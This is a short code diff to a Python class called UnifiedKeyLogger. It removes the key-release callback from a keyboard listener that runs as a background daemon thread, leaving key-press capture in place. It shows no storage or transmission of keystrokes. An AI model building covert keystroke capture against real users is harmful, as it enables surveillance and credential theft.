@@ -64,7 +64,6 @@ class UnifiedKeyLogger(KeyLogger):
         try:
             self.listener = keyboard.Listener(
                 on_press=self.on_press,
-                on_release=self.on_release
             )
             self.listener.daemon = True
             self.listener.start()
